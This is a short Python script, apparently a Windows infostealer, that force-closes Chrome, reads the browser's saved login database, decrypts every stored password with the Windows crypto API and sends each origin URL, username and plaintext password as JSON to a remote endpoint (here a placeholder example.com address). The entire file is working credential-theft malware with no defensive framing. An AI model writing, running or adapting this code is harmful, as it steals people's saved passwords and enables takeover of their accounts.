import os, sys
import sqlite3
import win32crypt
import json
from urllib import request, parse
import base64


def steal_passwords():
    path = get_path()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        for information in value:
            password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
            if password:
                params = json.dumps({
                    'origin_url': information[0],
                    'username': information[1],
                    'password': str(password)
                }).encode('utf8')
                credentials = base64.b64encode(b'user:pass')

                req = request.Request("http://www.example.com/restpoint", data=params,
                                      headers={'content-type': 'application/json',
                                               'Authorization': 'Basic %s' % credentials})
                request.urlopen(req)

    except sqlite3.OperationalError as e:
        sys.exit(0)


def get_path():
    path_name = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    if not os.path.isdir(path_name):
        sys.exit(0)

    return path_name


if __name__ == '__main__':
    os.system('taskkill /f /im chrome.exe')
    steal_passwords()